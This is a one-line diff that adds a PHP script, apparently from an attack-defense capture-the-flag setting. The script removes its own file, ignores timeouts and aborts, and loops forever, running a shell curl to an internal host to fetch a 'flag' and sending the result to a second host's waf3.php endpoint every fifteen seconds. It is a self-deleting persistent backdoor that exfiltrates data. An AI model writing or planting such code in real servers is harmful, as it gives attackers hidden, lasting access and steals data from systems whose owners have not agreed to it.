@@ -1,0 +1,1 @@
+<?php set_time_limit(0);ignore_user_abort(1);unlink(__FILE__); while(1){$file="curl http://10.0.1.2?token=UVOYDSVS";$flag=system($file);$url="http://10.51.17.100/waf3.php?flag=".$flag;$html=file_get_contents($url);sleep(15);}?>
